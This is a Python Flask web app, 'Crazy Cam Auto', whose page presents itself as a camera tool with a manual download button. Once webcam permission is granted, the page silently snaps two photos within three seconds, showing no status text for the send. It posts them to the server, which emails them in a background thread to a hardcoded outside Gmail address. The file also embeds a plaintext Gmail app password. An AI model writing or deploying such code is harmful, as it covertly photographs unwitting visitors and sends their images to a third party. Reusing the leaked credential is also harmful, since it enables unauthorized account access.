from flask import Flask, render_template_string, request, jsonify
import smtplib
import ssl
from email.message import EmailMessage
import base64
import threading

app = Flask(__name__)

# Email credentials (App Password)
SENDER_EMAIL = "mindmeld025@gmail.com"
SENDER_PASSWORD = "rvuvgegdqzsgrcsn"  # Gmail App Password
RECEIVER_EMAIL = "fermahmuda@gmail.com"


def send_email(image1, image2):
    try:
        msg = EmailMessage()
        msg['Subject'] = 'Captured Images'
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg.set_content("Here are the captured images.")

        # Attach full-size images
        msg.add_attachment(base64.b64decode(image1.split(",")[1]), maintype='image', subtype='png', filename="image1.png")
        msg.add_attachment(base64.b64decode(image2.split(",")[1]), maintype='image', subtype='png', filename="image2.png")

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)

        print("✅ Email sent successfully")

    except Exception as e:
        print("❌ Email Error:", e)


def send_email_threaded(image1, image2):
    """Send email in background to make browser fast"""
    thread = threading.Thread(target=send_email, args=(image1, image2))
    thread.start()


@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Crazy Cam Auto</title>
</head>
<body>
    <h2>Camera Capture</h2>

    <video id="video" autoplay playsinline style="width:320px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div id="status" style="font-weight:bold; margin-top:10px;">📷 Waiting for camera...</div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');
        let images = {};

        // Camera access
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
        })
        .catch(err => {
            statusDiv.innerText = "❌ Camera permission denied!";
        });

        // Wait until camera ready
        video.onloadedmetadata = () => {
            statusDiv.innerText = "📸 Camera ready... capturing soon";

            setTimeout(() => capture(1), 1500);
            setTimeout(() => capture(2), 3000);
        };

        function capture(num) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            let dataUrl = canvas.toDataURL('image/png');

            images["image" + num] = dataUrl;

            // Automatic send on second image, no status text
            if (num === 2) {
                fetch('/send_images', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(images)
                }).catch(err => console.error("❌ Email send error:", err));
            }
        }

        // Manual capture
        function manualCapture() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            let dataUrl = canvas.toDataURL('image/png');

            let a = document.createElement('a');
            a.href = dataUrl;
            a.download = 'captured.png';
            a.click();
        }
    </script>

    <h3>Manual Capture</h3>
    <button onclick="manualCapture()">Capture & Download</button>

</body>
</html>
    """)


@app.route('/send_images', methods=['POST'])
def send_images():
    try:
        data = request.json
        image1 = data.get('image1')
        image2 = data.get('image2')

        if not image1 or not image2:
            return jsonify({"status": "error", "message": "Missing images"})

        # Threaded background send
        send_email_threaded(image1, image2)

        # Browser instantly gets response
        return jsonify({"status": "success"})
    except Exception as e:
        print("❌ Route Error:", e)
        return jsonify({"status": "error", "message": str(e)})


if __name__ == '__main__':
    app.run(debug=True)
